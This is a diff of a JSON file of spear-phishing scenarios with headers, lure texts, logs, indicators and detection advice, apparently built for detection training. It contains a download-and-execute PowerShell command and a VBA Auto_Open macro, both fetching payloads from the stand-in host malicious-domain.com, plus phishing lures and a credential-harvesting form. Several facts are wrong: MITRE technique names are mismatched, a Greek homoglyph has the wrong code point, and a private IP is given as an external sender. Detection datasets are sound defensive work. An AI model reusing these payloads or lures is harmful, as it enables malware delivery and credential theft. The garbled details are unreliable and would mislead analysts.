@@ -1,158 +1,196 @@
 {
   "examples": [
     {
-      "scenario": "Spear phishing email targeting CFO with a fraudulent invoice request using CEO impersonation",
+      "scenario": "Spear phishing email targeting a finance department employee with a fake invoice attachment, leveraging personal details to increase credibility.",
       "technical_data": {
-        "email_headers": "Return-Path: <ceo@company-example.com>\r\nReceived: from mail-outbound01.company-example.com (mail-outbound01.company-example.com [192.0.2.45])\r\n\tby mail.company-example.com (Postfix) with ESMTPS id 3F1A7203D4\r\n\tfor <cfo@company-example.com>; Wed, 12 Apr 2023 14:15:42 -0400 (EDT)\r\nReceived-SPF: pass (mail.company-example.com: domain of ceo@company-example.com designates 192.0.2.45 as permitted sender) receiver=mail.company-example.com; client-ip=192.0.2.45; envelope-from=ceo@company-example.com; helo=mail-outbound01.company-example.com;\r\nAuthentication-Results: mail.company-example.com; dkim=pass (1024-bit key) header.d=company-example.com; spf=pass smtp.mailfrom=ceo@company-example.com; dmarc=pass (p=quarantine) header.from=company-example.com\r\nX-Mailer: Microsoft Outlook 16.0\r\nMessage-ID: <CAJ7Z=2E1i9+9wU2p6xM1r0zYQ4@company-example.com>\r\nDate: Wed, 12 Apr 2023 14:15:40 -0400\r\nFrom: \"John Smith\" <ceo@company-example.com>\r\nTo: \"Jane Doe\" <cfo@company-example.com>\r\nSubject: Urgent: Updated Invoice for Q1 Payments\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"\r\n",
-        "email_body_html": "<html><body><p>Hi Jane,</p><p>Please find attached the updated invoice for the Q1 vendor payments. Kindly review and process the payment to the following bank account immediately as per CEO's instructions.</p><p><b>Bank Details:</b><br/>Account Name: Global Services Ltd.<br/>Account Number: 1234567890123456<br/>Bank: Bank of Metropolis<br/>SWIFT: BOMMUS33</p><p>Let me know if you have any questions.</p><p>Regards,<br/>John Smith<br/>CEO, Company Example</p></body></html>",
-        "smtp_transaction_log": "220 mail.company-example.com ESMTP Postfix\r\nEHLO mail-outbound01.company-example.com\r\n250-mail.company-example.com\r\n250-PIPELINING\r\n250-SIZE 52428800\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<ceo@company-example.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cfo@company-example.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email body transmitted]\r\n.\r\n250 2.0.0 Ok: queued as 3F1A7203D4\r\nQUIT\r\n221 2.0.0 Bye",
-        "suspicious_domain_registration": {
-          "domain": "company-example.com",
-          "registrar": "ExampleRegistrar Inc.",
-          "creation_date": "2010-02-15T10:22:00Z",
-          "updated_date": "2023-03-01T08:00:00Z",
+        "email_headers": "Return-Path: <billing@payroll-secure.com>\r\nReceived: from mail.payroll-secure.com (mail.payroll-secure.com [192.168.100.45])\r\n\tby mail.company.com (Postfix) with ESMTPS id 3G2F745F23\r\n\tfor <jane.doe@company.com>; Wed, 26 Apr 2024 10:12:21 -0400 (EDT)\r\nReceived-SPF: pass (company.com: domain of billing@payroll-secure.com designates 192.168.100.45 as permitted sender)\r\nAuthentication-Results: mail.company.com; dkim=pass header.d=payroll-secure.com; spf=pass smtp.mailfrom=billing@payroll-secure.com;\r\nX-Mailer: Microsoft Outlook 16.0\r\nMessage-ID: <CAJf-4=9u1kO2fE0W6pQ@mail.payroll-secure.com>\r\nSubject: Invoice #INV-2024-0423 for Acme Corp\r\nFrom: \"Payroll Department\" <billing@payroll-secure.com>\r\nTo: jane.doe@company.com\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_12345_67890\"\r\nX-Originating-IP: [192.168.100.45]",
+        "email_body": "------=_Part_12345_67890\r\nContent-Type: text/plain; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\nDear Jane,\r\n\r\nPlease find attached the invoice #INV-2024-0423 for the recent Acme Corp consulting services you requested. Kindly process this by EOD to avoid delays.\r\n\r\nBest regards,\r\n\r\nMark Smith\r\nPayroll Department\r\nAcme Corp\r\n\r\n------=_Part_12345_67890\r\nContent-Type: application/pdf; name=\"Invoice_INV-2024-0423.pdf\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Invoice_INV-2024-0423.pdf\"\r\n\r\nJVBERi0xLjQKJcfsj6IKNSAwIG9iago8PAovVGl0bGUgKP7/AEMAbwBtAG0AYQBuAGQAIABG\r\nb3JtKQovQ3JlYXRvciAoRmFrZSBQREYgQ3JlYXRvcikKL1Byb2R1Y2VyIChQREYgU3RhbmRh\r\ncmQpCi9DcmVhdGlvbkRhdGUgKEQ6MjAyNDA0MjYxMDIyMTEpCi9Nb2REYXRlIChEOjIwMjQw\r\nNDI2MTAyMjExKQovTGFuZ3VhZ2UgKGVuLVVTCik+PgplbmRvYmoK",
+        "smtp_transaction_logs": [
+          "220 mail.payroll-secure.com ESMTP Postfix",
+          "EHLO mail.company.com",
+          "250-mail.payroll-secure.com",
+          "250-PIPELINING",
+          "250-SIZE 10240000",
+          "250-ETRN",
+          "250-STARTTLS",
+          "250-AUTH PLAIN LOGIN",
+          "250-ENHANCEDSTATUSCODES",
+          "250-8BITMIME",
+          "250 DSN",
+          "MAIL FROM:<billing@payroll-secure.com>",
+          "250 2.1.0 Ok",
+          "RCPT TO:<jane.doe@company.com>",
+          "250 2.1.5 Ok",
+          "DATA",
+          "354 End data with <CR><LF>.<CR><LF>",
+          "... [email content] ...",
+          ".",
+          "250 2.0.0 Ok: queued as 3G2F745F23",
+          "QUIT",
+          "221 2.0.0 Bye"
+        ],
+        "domain_registration": {
+          "domain": "payroll-secure.com",
+          "registrar": "NameCheap, Inc.",
+          "creation_date": "2024-03-15T16:22:10Z",
+          "expiration_date": "2025-03-15T16:22:10Z",
           "registrant": {
-            "name": "Company Example IT Dept",
-            "organization": "Company Example",
-            "email": "itadmin@company-example.com"
+            "name": "Mark Smith",
+            "organization": "Payroll Security LLC",
+            "email": "mark.smith@payroll-secure.com",
+            "address": "123 Main St, Los Angeles, CA"
           },
-          "dns_records": {
-            "MX": [
-              "mail.company-example.com"
-            ],
-            "A": [
-              "192.0.2.45"
-            ]
-          }
+          "name_servers": [
+            "ns1.namecheap.com",
+            "ns2.namecheap.com"
+          ]
         },
-        "url_obfuscation_example": "https://company-example.com/login?redirect=https%3A%2F%2Fsecure.bankofmetropolis.com%2Fpayment",
-        "additional_notes": "The attacker used the legitimate company domain and a compromised internal mail server (192.0.2.45) to send the email, making it highly convincing. The personalized bank details in the email body were crafted from leaked vendor payment information obtained from previous data breaches."
+        "urls_in_email": [
+          "https://secure.payroll-secure.com/invoice/INV-2024-0423.pdf",
+          "http://payroll-secure.com/login?redirect=https%3A%2F%2Fcompany.com%2Fportal"
+        ]
       },
       "indicators": [
-        "Email from ceo@company-example.com sent from atypical outbound IP 192.0.2.45 not normally used for CEO emails",
-        "Urgent payment request with new bank details differing from previously used vendor accounts",
-        "URL contains redirect parameter pointing to external banking site used for credential harvesting",
-        "Authentication-Results showing DKIM and SPF pass but unusual sending pattern noted in SIEM",
-        "Email subject includes urgent financial terms combined with personalized user name"
+        "Sender domain payroll-secure.com newly registered (~6 weeks ago)",
+        "Sender IP 192.168.100.45 not previously seen in company mail logs",
+        "Attachment with suspicious PDF base64 encoded content",
+        "URL containing redirect parameter to company.com but hosted on suspicious domain",
+        "Email header contains X-Originating-IP not consistent with organization's mail servers"
       ],
-      "detection_method": "Monitor outbound email traffic for deviations in sending IPs and volume from executive accounts; Implement advanced phishing detection tools analyzing email content for payment request context; Correlate new bank account details in emails with vendor payment history; Employ user training simulations emphasizing CEO impersonation and urgent invoice requests; Use URL rewriting and scanning to detect redirect-based phishing links.",
+      "detection_method": "Correlate SPF/DKIM pass with domain age and reputation; use sandbox to analyze PDF attachment for embedded exploits; URL analysis for redirects and domain age; alert on new domains mimicking internal departments; user education to verify invoices through secondary channel (phone call).",
       "relevant_mitre_techniques": [
-        "T1566.002 - Phishing: Spearphishing Link",
-        "T1598 - Phishing",
-        "T1598.002 - Spearphishing via Service",
+        "T1566.001 - Spearphishing Attachment",
+        "T1566.002 - Spearphishing Link",
+        "T1598.002 - Phishing for Information",
         "T1204.002 - User Execution: Malicious File"
       ]
     },
     {
-      "scenario": "Spear phishing email with weaponized Office document exploiting CVE-2022-30190 (Follina) to deliver remote code execution payload",
+      "scenario": "Spear phishing email pretending to be from HR manager, crafted using LinkedIn data, with a URL containing Unicode homoglyphs to harvest employee credentials.",
       "technical_data": {
-        "email_headers": "Return-Path: <john.doe@trustedpartner.com>\r\nReceived: from mail.trustedpartner.com (mail.trustedpartner.com [203.0.113.77])\r\n\tby mail.company-example.com (Postfix) with ESMTPS id 8D7C8401B2\r\n\tfor <employee@company-example.com>; Fri, 21 Oct 2022 09:32:15 -0400 (EDT)\r\nReceived-SPF: fail (mail.company-example.com: domain of john.doe@trustedpartner.com does not designate 203.0.113.77 as permitted sender) receiver=mail.company-example.com; client-ip=203.0.113.77; envelope-from=john.doe@trustedpartner.com; helo=mail.trustedpartner.com;\r\nAuthentication-Results: mail.company-example.com; dkim=none; spf=fail smtp.mailfrom=john.doe@trustedpartner.com; dmarc=fail header.from=trustedpartner.com\r\nX-Mailer: Microsoft Outlook 16.0\r\nMessage-ID: <CAK1+o9U2+2H4P7=xyz123@mail.trustedpartner.com>\r\nDate: Fri, 21 Oct 2022 09:32:13 -0400\r\nFrom: \"John Doe\" <john.doe@trustedpartner.com>\r\nTo: \"Employee Name\" <employee@company-example.com>\r\nSubject: Q3 Financial Summary - Confidential\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_12345_67890\"\r\n",
-        "email_body_plain": "Please review the attached Q3 financial summary for our joint project. This document contains sensitive data and should not be shared externally.\r\n\r\nBest,\r\nJohn Doe",
-        "attachment_filename": "Q3_Summary.doc",
-        "attachment_sha256": "d2c7f1a2b4e5c6d7e8f9a0b1c2d3e4f567890abcdef1234567890abcdef123456",
-        "attachment_ole_object": "Embedded OLE object triggers ms-msdt URL exploit to execute PowerShell command on Windows 10 systems",
-        "exploit_payload": "powershell -nop -w hidden -c \"Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.ps1' -OutFile 'C:\\Windows\\Temp\\payload.ps1'; powershell -ExecutionPolicy Bypass -File 'C:\\Windows\\Temp\\payload.ps1'\"",
-        "smtp_transaction_log": "220 mail.company-example.com ESMTP Postfix\r\nEHLO mail.trustedpartner.com\r\n250-mail.company-example.com\r\n250-PIPELINING\r\n250-SIZE 52428800\r\n250-STARTTLS\r\nMAIL FROM:<john.doe@trustedpartner.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@company-example.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email with attachment transmitted]\r\n.\r\n250 2.0.0 Ok: queued as 8D7C8401B2\r\nQUIT\r\n221 2.0.0 Bye",
-        "dns_whois_suspicious_domain": {
-          "domain": "malicious-domain.com",
-          "registrar": "Shady Registrar LLC",
-          "creation_date": "2022-09-30T12:00:00Z",
-          "updated_date": "2022-10-20T18:00:00Z",
+        "email_headers": "Return-Path: <hr@compa\u03b7y-hr.com>\r\nReceived: from mail.compa\u03bdy-hr.com (mail.compa\u03bdy-hr.com [203.0.113.77])\r\n\tby mail.company.com (Postfix) with ESMTPS id F4C3B1D9\r\n\tfor <john.smith@company.com>; Thu, 27 Apr 2024 14:07:35 -0400 (EDT)\r\nReceived-SPF: fail (company.com: domain of hr@compa\u03b7y-hr.com does not designate 203.0.113.77 as permitted sender)\r\nAuthentication-Results: mail.company.com; dkim=fail header.d=compa\u03b7y-hr.com; spf=fail smtp.mailfrom=hr@compa\u03b7y-hr.com;\r\nX-Mailer: Apple Mail (2.3445.5.20)\r\nMessage-ID: <CAJf+77GHkO2fE0W6pQ@mail.compa\u03b7y-hr.com>\r\nSubject: Urgent: Update Your Employee Benefits Information\r\nFrom: \"Laura Green\" <hr@compa\u03b7y-hr.com>\r\nTo: john.smith@company.com\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=utf-8",
+        "email_body_html": "<html><body><p>Hi John,</p><p>As per our latest HR policy update, you are required to confirm your employee benefits information by accessing the secure portal below:</p><p><a href=\"http://compa\u03bdy-hr.com/login?user=john.smith\">Update Benefits Info</a></p><p>Failure to comply may result in suspension of benefits.</p><p>Regards,<br>Laura Green<br>HR Manager</p></body></html>",
+        "smtp_transaction_logs": [
+          "220 mail.compa\u03bdy-hr.com ESMTP Postfix",
+          "EHLO mail.company.com",
+          "250-mail.compa\u03bdy-hr.com",
+          "250-PIPELINING",
+          "250-SIZE 20480000",
+          "250-STARTTLS",
+          "250 AUTH PLAIN LOGIN",
+          "MAIL FROM:<hr@compa\u03bdy-hr.com>",
+          "250 2.1.0 Ok",
+          "RCPT TO:<john.smith@company.com>",
+          "250 2.1.5 Ok",
+          "DATA",
+          "354 End data with <CR><LF>.<CR><LF>",
+          "... [email content] ...",
+          ".",
+          "250 2.0.0 Ok: queued as F4C3B1D9",
+          "QUIT",
+          "221 2.0.0 Bye"
+        ],
+        "domain_registration": {
+          "domain": "compa\u03b7y-hr.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2024-04-10T11:30:00Z",
+          "expiration_date": "2025-04-10T11:30:00Z",
           "registrant": {
-            "name": "PrivacyProtect",
-            "organization": "Privacy Protection Service",
-            "email": "contact@privacyprotect.org"
+            "name": "Private Registration",
+            "organization": "Privacy Protect, LLC",
+            "email": "contact@privacyprotect.org",
+            "address": "PO Box 1234, Scottsdale, AZ"
           },
-          "dns_records": {
-            "A": [
-              "198.51.100.123"
-            ],
-            "NS": [
-              "ns1.shadyhost.net",
-              "ns2.shadyhost.net"
-            ]
-          }
+          "name_servers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ]
         },
-        "network_packet_capture_excerpt": "Frame 456: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\r\nEthernet II, Src: 00:11:22:33:44:55, Dst: 66:77:88:99:aa:bb\r\nInternet Protocol Version 4, Src: 192.168.1.100, Dst: 198.51.100.123\r\nTransmission Control Protocol, Src Port: 53412, Dst Port: 80, Seq: 1, Ack: 1, Len: 512\r\nHypertext Transfer Protocol\r\n    GET /payload.ps1 HTTP/1.1\r\n    Host: malicious-domain.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: */*\r\n",
-        "powershell_script_snippet": "Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.ps1' -OutFile 'C:\\Windows\\Temp\\payload.ps1'; powershell -ExecutionPolicy Bypass -File 'C:\\Windows\\Temp\\payload.ps1'",
-        "process_creation_log": "2022-10-21T09:33:15.123Z - New Process Created: powershell.exe -nop -w hidden -c Invoke-WebRequest -Uri http://malicious-domain.com/payload.ps1 -OutFile C:\\Windows\\Temp\\payload.ps1; powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\payload.ps1"
+        "urls_in_email": [
+          "http://xn--compay-hr-6bb.com/login?user=john.smith"
+        ],
+        "url_analysis": {
+          "punycode": "xn--compay-hr-6bb.com",
+          "unicode_homoglyph_domain": "compa\u03b7y-hr.com",
+          "homoglyph_characters": {
+            "\u03b7": "Greek small letter eta (U+03BD) substituting Latin letter n"
+          },
+          "redirect_chain": [],
+          "landing_page_response_headers": {
+            "Content-Type": "text/html; charset=UTF-8",
+            "Server": "Apache/2.4.41 (Ubuntu)"
+          },
+          "landing_page_content_snippet": "<form action=\"/submit\" method=\"POST\"><input name=\"username\" /><input name=\"password\" type=\"password\" /><input type=\"submit\" /></form>"
+        }
       },
       "indicators": [
-        "Email SPF and DMARC fail for john.doe@trustedpartner.com domain",
-        "Attachment with SHA-256 hash d2c7f1a2b4e5c6d7e8f9a0b1c2d3e4f567890abcdef1234567890abcdef123456 is a weaponized Office document exploiting ms-msdt protocol",
-        "Outbound HTTP GET request to http://malicious-domain.com/payload.ps1 immediately after opening document",
-        "Process creation with obfuscated PowerShell command line invoking remote script download and execution",
-        "Suspicious domain registered less than one month ago with privacy-protected WHOIS info"
+        "Domain contains Unicode homoglyph '\u03b7' instead of Latin 'n' to mimic legitimate company domain",
+        "SPF and DKIM fail indicating unauthorized sender",
+        "Newly created domain with privacy-protected registration",
+        "Link in email points to punycode-encoded domain",
+        "Landing page mimics internal login portal requesting credentials"
       ],
-      "detection_method": "Deploy advanced email gateway analysis looking for ms-msdt exploit patterns in attachments; Monitor network for PowerShell outbound web requests to newly registered or suspicious domains; Enforce application whitelisting blocking PowerShell with suspicious parameters; Use endpoint detection and response (EDR) tools to detect process creation chains involving msdt.exe or powershell.exe with encoded commands; Correlate failed SPF/DKIM/DMARC checks with unexpected sender domains.",
+      "detection_method": "Detect domains using Unicode homoglyphs via IDN spoofing detection tools; monitor SPF/DKIM failures; analyze email header anomalies; sandbox URL to inspect form content and behavior; educate users on domain inspection and verifying URLs.",
       "relevant_mitre_techniques": [
         "T1566.001 - Spearphishing Attachment",
-        "T1204.002 - User Execution: Malicious File",
-        "T1204.002 - User Execution",
-        "T1218.011 - System Services: Msdt",
-        "T1059.001 - Command and Scripting Interpreter: PowerShell"
+        "T1566.002 - Spearphishing Link",
+        "T1598.002 - Phishing for Information",
+        "T1598.001 - Spearphishing via Service"
       ]
     },
     {
-      "scenario": "Spear phishing with personalized credential harvesting link using homoglyph domain and URL shortening",
+      "scenario": "Spear phishing email with a macro-enabled Excel attachment named \u2018Q2_Financials.xlsm\u2019 impersonating the CFO to deploy credential-stealing malware upon opening.",
       "technical_data": {
-        "email_headers": "Return-Path: <it-support@company-example.com>\r\nReceived: from mail.fake-company.com (mail.fake-company.com [198.51.100.88])\r\n\tby mail.company-example.com (Postfix) with ESMTPS id 9F8B2317C5\r\n\tfor <employee@company-example.com>; Mon, 03 Jan 2023 07:45:30 -0500 (EST)\r\nReceived-SPF: fail (mail.company-example.com: domain of it-support@company-example.com does not designate 198.51.100.88 as permitted sender) receiver=mail.company-example.com; client-ip=198.51.100.88; envelope-from=it-support@company-example.com; helo=mail.fake-company.com;\r\nAuthentication-Results: mail.company-example.com; dkim=none; spf=fail smtp.mailfrom=it-support@company-example.com; dmarc=fail header.from=company-example.com\r\nX-Mailer: Thunderbird 78.5.0\r\nMessage-ID: <CAJ3XvP7u_B=9M9Pq8p7@mail.fake-company.com>\r\nDate: Mon, 3 Jan 2023 07:45:27 -0500\r\nFrom: \"IT Support\" <it-support@company-example.com>\r\nTo: \"Employee Name\" <employee@company-example.com>\r\nSubject: Action Required: Password Reset Notification\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n",
-        "email_body_plain": "Dear Employee,\n\nDue to recent security updates, all employees are required to reset their passwords immediately. Please follow the link below to reset your password:\n\nhttps://bit.ly/3xR\u0251nd0m\n\nFailure to do so will result in account suspension.\n\nThank you,\nIT Support Team",
-        "url_analysis": {
-          "short_url": "https://bit.ly/3xR\u0251nd0m",
-          "expanded_url": "http://c\u043empany-example.com/login/reset?user=employee@company-example.com",
-          "homoglyph_domain": "c\u043empany-example.com",
-          "homoglyph_notes": "The 'o' in 'company' is replaced with the Cyrillic small letter '\u043e' (U+043E), visually identical to Latin 'o'.",
-          "phishing_page": {
-            "html_title": "Company Example Login",
-            "form_action": "http://c\u043empany-example.com/login/authenticate",
-            "form_fields": [
-              "username",
-              "password",
-              "security_token"
-            ],
-            "ssl_certificate": "Self-signed, expired certificate",
-            "server_ip": "198.51.100.88"
-          }
+        "email_headers": "Return-Path: <cfo@companyfinance.com>\r\nReceived: from mail.companyfinance.com (mail.companyfinance.com [198.51.100.23])\r\n\tby mail.company.com (Postfix) with ESMTPS id C1D3E9A9\r\n\tfor <michael.brown@company.com>; Fri, 28 Apr 2024 08:45:10 -0400 (EDT)\r\nReceived-SPF: pass (company.com: domain of cfo@companyfinance.com designates 198.51.100.23 as permitted sender)\r\nAuthentication-Results: mail.company.com; dkim=pass header.d=companyfinance.com; spf=pass smtp.mailfrom=cfo@companyfinance.com;\r\nX-Mailer: Microsoft Outlook 16.0\r\nMessage-ID: <CAJf+4Pq7kO2fE0W6pQ@mail.companyfinance.com>\r\nSubject: Q2 Financials Review - Action Required\r\nFrom: \"Sarah Johnson\" <cfo@companyfinance.com>\r\nTo: michael.brown@company.com\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_98765_43210\"",
+        "email_body": "------=_Part_98765_43210\r\nContent-Type: text/plain; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\nHi Michael,\r\n\r\nPlease find attached the Q2 financials spreadsheet. Kindly enable macros to view the updated figures and run the embedded analysis.\r\n\r\nBest,\r\nSarah\r\nCFO\r\n\r\n------=_Part_98765_43210\r\nContent-Type: application/vnd.ms-excel.sheet.macroEnabled.12; name=\"Q2_Financials.xlsm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Q2_Financials.xlsm\"\r\n\r\nUEsDBBQABgAIAAAAIQDp6lL6bQEAAMkFAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooA\r\nAAUEsHCMF1cX6cAAAAhAAAAUEsDBBQABgAIAAAAIQDjV1g+7gEAAN0FAAATAAgCW0NvbnRlbnRf\r\nVHlwZXNdLnhtbCCiBAIooAAAUEsHCIz4kZcAAAAhAAAAUEsDBBQABgAIAAAAIQDpRkTQIAAAc4\r\nFAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAAUEsBAhQAFAAGAAgAAAAhAOnpS+m0\r\nBAADJBQAAEwAIACAAAAAAAAAAQAO1BAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAhQAFAAG\r\nAAgAAAAhAONXWD7uAQAA3QUAAEwAIACAAAAAAAAAAQAO1BAAAAABbQ29udGVudF9UeXBlc10u\r\neG1sUEsBAhQAFAAGAAgAAAAhAOlGRE0CAABzgUAAEwAIACAAAAAAAAAAQAO1BAAAAABbQ29udG\r\nVudF9UeXBlc10ueG1sUEsFBgAAAAABAAEAPwAAAEIAAAAAAA==",
+        "macro_code_snippet": "Sub Auto_Open()\r\n    Dim strURL As String\r\n    strURL = \"http://malicious-domain.com/payload.exe\"\r\n    Dim WinHttpReq As Object\r\n    Set WinHttpReq = CreateObject(\"Microsoft.XMLHTTP\")\r\n    WinHttpReq.Open \"GET\", strURL, False\r\n    WinHttpReq.Send\r\n    If WinHttpReq.Status = 200 Then\r\n        Dim oStream As Object\r\n        Set oStream = CreateObject(\"ADODB.Stream\")\r\n        oStream.Open\r\n        oStream.Type = 1\r\n        oStream.Write WinHttpReq.ResponseBody\r\n        oStream.SaveToFile Environ(\"TEMP\") & \"\\payload.exe\", 2\r\n        oStream.Close\r\n        Shell Environ(\"TEMP\") & \"\\payload.exe\", vbHide\r\n    End If\r\nEnd Sub",
+        "smtp_transaction_logs": [
+          "220 mail.companyfinance.com ESMTP Postfix",
+          "EHLO mail.company.com",
+          "250-mail.companyfinance.com",
+          "250-PIPELINING",
+          "250-SIZE 51200000",
+          "250-STARTTLS",
+          "250-AUTH PLAIN LOGIN",
+          "250-ENHANCEDSTATUSCODES",
+          "250-8BITMIME",
+          "250 DSN",
+          "MAIL FROM:<cfo@companyfinance.com>",
+          "250 2.1.0 Ok",
+          "RCPT TO:<michael.brown@company.com>",
+          "250 2.1.5 Ok",
+          "DATA",
+          "354 End data with <CR><LF>.<CR><LF>",
+          "... [email content] ...",
+          ".",
+          "250 2.0.0 Ok: queued as C1D3E9A9",
+          "QUIT",
+          "221 2.0.0 Bye"
+        ],
+        "file_hashes": {
+          "md5": "3f786850e387550fdab836ed7e6dc881",
+          "sha1": "9c1185a5c5e9fc54612808977ee8f548b2258d31",
+          "sha256": "6dcd4ce23d88e2ee9568ba546c007c63a4f0b21f6a3a15a9f0a0b3b7b212b8e8"
         },
-        "smtp_transaction_log": "220 mail.company-example.com ESMTP Postfix\r\nEHLO mail.fake-company.com\r\n250-mail.company-example.com\r\n250-PIPELINING\r\n250-SIZE 52428800\r\nMAIL FROM:<it-support@company-example.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@company-example.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\n[Email body transmitted]\r\n.\r\n250 2.0.0 Ok: queued as 9F8B2317C5\r\nQUIT\r\n221 2.0.0 Bye",
-        "dns_whois_homoglyph_domain": {
-          "domain": "c\u043empany-example.com",
-          "registrar": "Anonymous Registrar Ltd.",
-          "creation_date": "2022-11-15T09:10:00Z",
-          "updated_date": "2023-01-01T12:00:00Z",
-          "registrant": {
-            "name": "PrivacyGuard",
-            "organization": "Privacy Protection",
-            "email": "contact@privacyguard.org"
-          },
-          "dns_records": {
-            "A": [
-              "198.51.100.88"
-            ],
-            "NS": [
-              "ns1.anonymousdns.com",
-              "ns2.anonymousdns.com"
-            ]
-          }
-        },
-        "webserver_access_log_excerpt": "198.51.100.88 - - [03/Jan/2023:07:46:12 -0500] \"GET /login/reset?user=employee@company-example.com HTTP/1.1\" 200 3456 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.88 - - [03/Jan/2023:07:47:30 -0500] \"POST /login/authenticate HTTP/1.1\" 302 123 \"http://c\u043empany-example.com/login/reset?user=employee@company-example.com\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
-        "post_data_example": "username=employee@company-example.com&password=P@ssw0rd!&security_token=5f2e4a8b7d1e2f3c"
+        "network_traffic_pattern": "HTTP GET to http://malicious-domain.com/payload.exe upon macro execution, outgoing TCP connection on port 80 to 198.51.100.55",
+        "process_creation_chain": [
+          "EXCEL.EXE (PID 1234) launches WScript.exe (PID 4567) running embedded macro",
+          "WScript.exe downloads payload.exe to %TEMP% and executes it hidden"
+        ]
       },
       "indicators": [
-        "Email SPF and DMARC fail for legitimate company domain but email sent from unrelated IP 198.51.100.88",
-        "Shortened URL expands to homoglyph domain with Cyrillic '\u043e' instead of Latin 'o'",
-        "Phishing page uses self-signed expired SSL certificate",
-        "DNS records for homoglyph domain registered recently with privacy-protected WHOIS",
-        "HTTP POST requests to /login/authenticate with stolen credentials logged"
+        "Macro-enabled Excel attachment with embedded Auto_Open macro",
+        "Download URL for payload.exe hosted on suspicious domain malicious-domain.com",
+        "File hashes matching known malware samples in threat intel feeds",
+        "Unusual outbound HTTP connections from workstation to external IP 198.51.100.55",
+        "Process chain indicating Excel launched script executing external payload"
       ],
-      "detection_method": "Implement URL rewriting and inspection at email gateway to expand and analyze shortened URLs; Use homograph attack detection tools to identify visually similar domains; Correlate SPF/DMARC failures with sender IPs and domains; Monitor webserver logs for credential submission patterns and suspicious POST requests; Educate users on risks of password reset emails with shortened links.",
+      "detection_method": "Use sandbox detonation to detect macro behaviors; monitor email attachments for macros; inspect process creation chains for script execution from Office apps; network IDS signatures for known malicious domains and IPs; endpoint protection alert on suspicious downloads and hidden execution.",
       "relevant_mitre_techniques": [
-        "T1566.002 - Phishing: Spearphishing Link",
-        "T1566 - Phishing",
-        "T1586 - Compromise Infrastructure",
-        "T1598.002 - Spearphishing via Service",
-        "T1556.001 - Credentials in Files"
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.005 - Command and Scripting Interpreter: Visual Basic",
+        "T1105 - Ingress Tool Transfer"
       ]
     }
   ]
